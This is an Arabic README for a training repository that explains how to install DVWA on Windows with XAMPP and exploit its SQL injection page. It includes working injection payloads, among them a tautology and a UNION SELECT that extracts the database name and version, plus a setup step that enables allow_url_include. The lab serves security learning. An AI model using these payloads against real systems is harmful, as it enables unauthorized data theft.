<div dir="rtl" markdown="1">
# دليل عملي لاستغلال ثغرة **SQL Injection** في DVWA على **ويندوز**

مرحبًا! هذا المستودع يشرح خطوة بخطوة كيفية استغلال ثغرة **حقن SQL** في تطبيق **DVWA** (Damn Vulnerable Web Application) على نظام **Windows**.

---

## 📋 محتويات المستودع

1. [المتطلبات الأساسية](#المتطلبات-الأساسية)
2. [التثبيت والإعداد](#التثبيت-والإعداد)
3. [تجربة الثغرة](#تجربة-الثغرة)
4. [أمثلة Payloads](#أمثلة-payloads)
5. [المراجع](#المراجع)
6. [الرخصة](#الرخصة)

---

## المتطلبات الأساسية

- **نظام التشغيل:** Windows (7/8/10/11)
- **بيئة XAMPP:** Apache + PHP + MySQL
- **مجلد DVWA:** `C:\xampp\htdocs\dvwa`
- **متصفح:** Chrome أو Firefox

---

## التثبيت والإعداد

1. **تحميل XAMPP**
   - نزّل من: https://www.apachefriends.org
   - ثبّت Apache و PHP و MySQL.

2. **إحضار DVWA**
   - افتح PowerShell أو CMD ونفّذ:
     ```bash
     git clone https://github.com/digininja/DVWA.git C:\xampp\htdocs\dvwa
     ```
   - أو فك ضغط ملف ZIP داخل المجلد أعلاه.

3. **ضبط إعدادات PHP**
   - افتح `C:\xampp\php\php.ini` وابحث عن:
     ```ini
     magic_quotes_gpc = Off
     allow_url_include = On
     ```
   - ثم أعد تشغيل خدمة Apache من لوحة XAMPP.

4. **إعداد قاعدة البيانات**
   - شغّل MySQL من لوحة XAMPP.
   - افتح المتصفح وانتقل إلى:
     ```
     http://localhost/phpmyadmin
     ```
   - أنشئ قاعدة بيانات جديدة باسم: `dvwa`

5. **تهيئة DVWA**
   - انسخ الملف `config.inc.php.dist` في المجلد `C:\xampp\htdocs\dvwa\config` وأعد تسميته إلى `config.inc.php`.
   - حرّر `config.inc.php` واجعل:
     ```php
     $_DVWA['db_user']     = 'root';
     $_DVWA['db_password'] = '';
     ```
   - افتح:
     ```
     http://localhost/dvwa/setup.php
     ```
   - اضغط **Create / Reset Database**
   - سجّل الدخول:
     - المستخدم: `admin`
     - كلمة المرور: `password`

---

## تجربة الثغرة

1. من القائمة الجانبية اختر **SQL Injection**
2. تأكد أن مستوى الأمان **Low**
3. في حقل **User ID** أدخل:
   ```sql
   1' OR '1'='1
   ```
4. اضغط **Submit** لتحصل على جميع سجلات المستخدمين.

---

## أمثلة Payloads

| الهدف                       | Payload                                           |
| --------------------------- | ------------------------------------------------- |
| عرض كل المستخدمين           | `1' OR '1'='1`                                    |
| تعليق باقي الاستعلام       | `1'; --`                                          |
| جلب اسم القاعدة والإصدار    | `0' UNION SELECT null, database(), version() --`  |

---

## المراجع

- **DVWA GitHub:** https://github.com/digininja/DVWA  
- **PHP SQL Injection:** https://www.php.net/manual/en/security.sql-injection.php

---

## الرخصة

هذا المستند مرخص بموجب **MIT License**.  
© 2025  Bashar Naanah
</div>
